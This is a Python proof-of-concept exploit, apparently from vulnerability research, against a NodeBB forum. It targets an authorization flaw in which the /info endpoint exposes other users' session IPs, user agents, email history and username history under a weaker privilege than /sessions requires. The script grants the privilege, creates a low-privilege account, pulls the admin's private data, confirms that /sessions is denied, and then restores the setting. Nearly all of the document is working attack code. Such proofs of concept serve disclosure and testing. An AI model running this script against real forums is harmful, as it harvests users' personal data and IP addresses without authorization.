#!/usr/bin/env python3
"""
VULN-021 — /info over-exposes session IP/UA + email/username history under a weaker privilege
=============================================================================================

Vulnerable code (targets/NodeBB/):
  * src/controllers/accounts/info.js:29-39   sessions/emails/usernames/invitedBy assigned UNCONDITIONALLY
  * src/middleware/user.js:192-193           /info$ path exception grants access on `view:users:info`
  * (compare) src/api/users.js listEmails requires showemail/isAdminOrGlobalMod/self; /sessions requires canEdit

Vulnerability class: CWE-200 / CWE-284 (excessive data exposure / broken function-level authorization).

Flaw (plain English):
  The /info controller assigns session records (IP, UA, platform, datetime), full email history and
  username history WITHOUT any privilege check — only history/moderationNotes are gated by isPrivileged.
  The /info route is reachable under the weaker `view:users:info` privilege, whereas the SAME data via
  the dedicated /sessions route requires canEdit and via listEmails requires showemail/self/priv. So a
  holder of only `view:users:info` reads, for ANY user, session IPs/UAs + email/username history that
  /sessions and listEmails would deny.

Exploitation idea:
  Admin delegates `groups:view:users:info` to registered-users (a config choice). A low-priv member then
  reads the ADMIN's /info (session IPs, email/username history), while /sessions returns 403.

What a successful run proves:
  A delegated non-moderator reads sessions[].ip + emails + usernames for the admin via /info, while the
  dedicated /sessions endpoint returns 403 for the same caller (authorization divergence).
"""
import os
import sys
import secrets
import requests

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21372")
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "NodeBB-Adm1n-Sec2026!")
VICTIM_SLUG = os.environ.get("VICTIM_SLUG", "admin")   # rich target: has sessions/emails/usernames
PRIV = "groups:view:users:info"
TIMEOUT = 10
BROWSER_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    if _USE_COLOR and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}")
    else:
        print(f"[{tag}] {msg}")


def session_for(user, pw):
    s = requests.Session()
    s.headers["User-Agent"] = BROWSER_UA
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    s.post(f"{BASE_URL}/login", headers={"x-csrf-token": csrf},
           data={"username": user, "password": pw}, timeout=TIMEOUT).raise_for_status()
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    return s, csrf


def set_priv(admin, csrf, method, member):
    fn = admin.put if method == "grant" else admin.delete
    return fn(f"{BASE_URL}/api/v3/categories/0/privileges/{PRIV}",
              headers={"x-csrf-token": csrf, "Content-Type": "application/json"},
              json={"member": member}, timeout=TIMEOUT).status_code


def main():
    print("=" * 78)
    print("VULN-021: /info over-exposes session IP/UA + email/username history (config-gated)")
    print(f"Target: {BASE_URL}")
    print("=" * 78)
    log("INFO", "info.js:29-39 assigns sessions/emails/usernames unconditionally; /info gate is view:users:info")

    suffix = secrets.token_hex(4)
    viewer = f"viewer_{suffix}"
    viewer_pw = f"Pw-{secrets.token_hex(8)}!"

    admin, acsrf = session_for(ADMIN_USER, ADMIN_PASS)
    granted = False
    ok = False
    try:
        log("SETUP", f"admin delegates {PRIV} to registered-users (global cid 0) — a supported ACP choice")
        code = set_priv(admin, acsrf, "grant", "registered-users")
        granted = (code == 200)
        log("INFO", f"grant HTTP {code}")

        log("SETUP", f"creating low-priv member {viewer}")
        r = admin.post(f"{BASE_URL}/api/v3/users", headers={"x-csrf-token": acsrf, "Content-Type": "application/json"},
                       json={"username": viewer, "password": viewer_pw}, timeout=TIMEOUT)
        r.raise_for_status()

        s, _ = session_for(viewer, viewer_pw)
        who = s.get(f"{BASE_URL}/api/self", timeout=TIMEOUT).json()
        log("INFO", f"viewer session uid={who.get('uid')} isAdmin={who.get('isAdmin')} "
                    f"isGlobalMod={who.get('isGlobalModerator')} (must be False)")

        log("STEP", f"viewer GET /api/user/{VICTIM_SLUG}/info (the delegated, weaker-gated endpoint)")
        info = s.get(f"{BASE_URL}/api/user/{VICTIM_SLUG}/info", timeout=TIMEOUT)
        data = info.json() if info.status_code == 200 else {}
        sessions = data.get("sessions") or []
        emails = data.get("emails") or []
        usernames = data.get("usernames") or []
        ip = (sessions[0].get("ip") if sessions else None)
        log("INFO", f"/info HTTP {info.status_code} | sessions={len(sessions)} (first ip={ip!r}) | "
                    f"emails={[e.get('value') for e in emails]} | usernames={[u.get('value') for u in usernames]}")

        log("STEP", f"viewer GET /api/user/{VICTIM_SLUG}/sessions (dedicated endpoint, requires canEdit) — control")
        sess = s.get(f"{BASE_URL}/api/user/{VICTIM_SLUG}/sessions", timeout=TIMEOUT)
        log("INFO", f"/sessions HTTP {sess.status_code} (expect 403 — proves /info is a weaker gate for the same data)")

        leaked = bool(ip) and bool(emails) and bool(usernames)
        divergence = (sess.status_code in (401, 403))
        if leaked and divergence and not who.get("isAdmin") and not who.get("isGlobalModerator"):
            log("PROOF", f"a delegated non-privileged member read {VICTIM_SLUG}'s session IP ({ip}), email "
                         f"history and username history via /info, while /sessions returned "
                         f"{sess.status_code} for the same caller -> authorization divergence / over-exposure")
            ok = True
        else:
            log("FAIL", f"not reproduced (leaked={leaked}, /sessions={sess.status_code}, "
                        f"isAdmin={who.get('isAdmin')})")
    finally:
        if granted:
            log("SETUP", f"restoring: rescinding {PRIV} from registered-users")
            set_priv(admin, acsrf, "revoke", "registered-users")
            log("INFO", "privilege restored")

    print("-" * 78)
    if ok:
        log("OK", "exploit confirmed — /info exposes session IP/UA + email/username history under view:users:info")
        v = "==> VULN-021: CONFIRMED — /info over-exposure vs /sessions (authorization divergence, config-gated)"
        print(f"\033[1;32m{v}\033[0m" if _USE_COLOR else v)
        sys.exit(0)
    v = "==> VULN-021: FAILED — over-exposure not reproduced"
    print(f"\033[1;31m{v}\033[0m" if _USE_COLOR else v)
    sys.exit(1)


if __name__ == "__main__":
    main()
